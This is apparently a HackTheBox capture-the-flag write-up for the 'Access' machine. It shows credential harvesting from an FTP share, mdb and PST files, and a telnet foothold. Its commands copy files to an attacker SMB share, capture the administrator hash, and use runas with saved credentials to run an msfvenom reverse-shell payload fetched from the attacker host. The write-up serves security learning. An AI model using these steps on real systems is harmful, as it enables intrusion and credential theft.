***Overview**: Access is an Easy rated HTB machine that highlights how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It also exploits saved credentials to gain privileged access.*
# HTB: Access
## Scanning and Reconnaissance

- So we first start with a port scan to identify the open ports and we can see there are 3

![](assets/Access_assets/Pasted%20image%2020231115201222.png)

- then running a service scan on this open ports using Nmap

```shell

### Port 80
- Navigating to Port 80, we are brought to the page below

![](assets/Access_assets/Pasted%20image%2020231115072050.png)

### FTP

- So from our Nmap scan we saw that we have anonymous access to the FTP server, so when we access it we see we have Backups and Engineers directory
- we then see a file backup.mdb in our Backups directory, so we save the file but we encounter an error

![](assets/Access_assets/Pasted%20image%2020231115092518.png)

- to fix the error, we just the mode to binary mode by typing `binary` and we are able to download the file

![](assets/Access_assets/Pasted%20image%2020231115092421.png)

- then in the Engineer's directory, we also have an archive Access Control.zip so we save that too

![](assets/Access_assets/Pasted%20image%2020231115095925.png)

![](assets/Access_assets/Pasted%20image%2020231115092452.png)

- so now that we have retrieved the mdb database file, lets analyze it using mdbtools, we can look at a resource at [https://askmeaboutlinux.com/2023/08/07/how-to-read-ms-access-database-using-mdbtools-in-linux/](https://askmeaboutlinux.com/2023/08/07/how-to-read-ms-access-database-using-mdbtools-in-linux/)
- to list the tables in the database, we can do

```shell
mdb-tables backup.mdb
```

![](assets/Access_assets/Pasted%20image%2020231115164243.png)

- we can also convert any table to csv format so we can view it using an application like LibreOffice
- so for example we can convert the Machines table to csv format using

```shell
mdb-export backup.mdb Machines > machinestable.csv
```

![](assets/Access_assets/Pasted%20image%2020231115163817.png)

- then we can open it using LibreOffice calc

![](assets/Access_assets/Pasted%20image%2020231115163756.png)
- so we saw a table auth_user, in our list of tables

![](assets/Access_assets/Pasted%20image%2020231115164404.png)

- so we can export the table to csv format and view it as well and we've identified some credentials

![](assets/Access_assets/Pasted%20image%2020231115164320.png)

- so we got the password for engineer as access4u@security
- so since the archive we retrieved earlier from the Engineer's directory is password protected, we can retrieve the contents using the password we just got for the user engineer

![](assets/Access_assets/Pasted%20image%2020231115164926.png)

- from the archive, we retrieved a file which is a pst file, Microsoft Outlook Personal storage file

![](assets/Access_assets/Pasted%20image%2020231115165007.png)

```ad-info
PST (Personal Storage Table) is a data file used by Microsoft Outlook and other email programs to store personal data on your computer, this data includes emails, calendars, tasks, notes etc.
- its purposes are for backup, offline storage and data transfer
```
- to view the file we can install pst-utils

```shell
sudo apt install pst-utils
```

- after then we can can list the contents in the pst file using `lspst`

![](assets/Access_assets/Pasted%20image%2020231115170711.png)

- we can use the `readpst` command to export the data from the pst file to MBOX format

```shell
readpst -o output_dir 'Access Control.pst
```

![](assets/Access_assets/Pasted%20image%2020231115172535.png)

![](assets/Access_assets/Pasted%20image%2020231115172546.png)

```ad-info
unlike pst that is propritary to Microsoft Outlook, MBOX is an open format used by alot of email clients and software
```

- so now we can then view the mbox file in email clients like thunderbird, and we can see that we now have the password for the security user as 4Cc3ssC0ntr0ller

![](assets/Access_assets/Pasted%20image%2020231115173727.png)

## Foothold
### telnet
 - we are able to use the credentials we found to access the Microsoft telnet service on port 23, and we get a shell

![](assets/Access_assets/Pasted%20image%2020231115173936.png)

- and we have our user flag

![](assets/Access_assets/Pasted%20image%2020231115174017.png)

## Privilege Escalation
- we can check who we are as well as the privileges we have on the machine

```shell
C:\Users\security\Desktop>whoami /all

```

- we notice that we have a hidden directory .yawcam

![](assets/Access_assets/Pasted%20image%2020231115181550.png)

- we can view the contents of this directory

![](assets/Access_assets/Pasted%20image%2020231115181700.png)

- we can also recursively copy the content of this directory by setting up our own smb server, so we can analyze the files on our machine. so set up our smb server

```shell
impacket-smbserver smb ~/HTB/smb 
```

- then recursively copy using the xcopy command

```shell
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.6\smb\win

```

![](assets/Access_assets/Pasted%20image%2020231115183019.png)

- and we can see that we are retrieving the files in our smbserver

![](assets/Access_assets/Pasted%20image%2020231115183040.png)

- we can see the version for the yawcam as 0.6.2 in the ver.dat file, so we can check if there are any vulnerabilities related to this version

![](assets/Access_assets/Pasted%20image%2020231115183112.png)

### Check for stored credentials
- we can use the cmdkey command to check for stored credentials on our target

![](assets/Access_assets/Pasted%20image%2020231115201516.png)

- so we can run the command, and we can see that we do have stored Administrator

```shell
cmdkey /list
```

![](assets/Access_assets/Pasted%20image%2020231115191922.png)

- so we can use the runas command with the `/savecred` to run commands as the user using the stored credentials, so lets try to access a non-existent file in the share in our smbserver to see if we can retrieve the hash of the administrator, so we run 

```shell
runas /savecred /user:ACCESS\Administrator "\\10.10.14.19\smb\evil.exe"
```

- and in our smb server, we can see that we get the hash

![](assets/Access_assets/Pasted%20image%2020231115192515.png)

```
[*] AUTHENTICATE_MESSAGE (ACCESS\Administrator,ACCESS)

```

- we can also test this by running the `whoami` command as administrator and then putting the output in a file, and we can see that it shows that we are administrator, because we ran the command as administrator

```shell
runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe /c whoami > whoami.txt"
```

![](assets/Access_assets/Pasted%20image%2020231115194037.png)

```ad-info
/env: it loads the current environmental variables
/noprofile: prevents the loading of the user's profile, which makes the execution of the program faster
/savecred: specify we are using saved credentials if the user's credentials are cached in the system or to save credentials
/user: specify the user
then the command we want to run
```

Windows Privilege Escalation with Runas: [https://juggernaut-sec.com/runas/](https://juggernaut-sec.com/runas/)
### Reverse shell with runas
- so we use msfvenom to generate a reverse shell payload for us, and then we will execute this payload as adminstrator
![](assets/Access_assets/Pasted%20image%2020231115195521.png)

- after we've placed the file in our smb share on our smb server, we can then run the payload using runas

```shell
runas /env /noprofile /savecred /user:ACCESS\Administrator "\\10.10.14.6\smb\evil.exe"
```

![](assets/Access_assets/Pasted%20image%2020231115195612.png)

- and we can see that in our nc listener, we also got a shell as administrator

![](assets/Access_assets/Pasted%20image%2020231115200239.png)

- and we can view the root file

![](assets/Access_assets/Pasted%20image%2020231115200312.png)
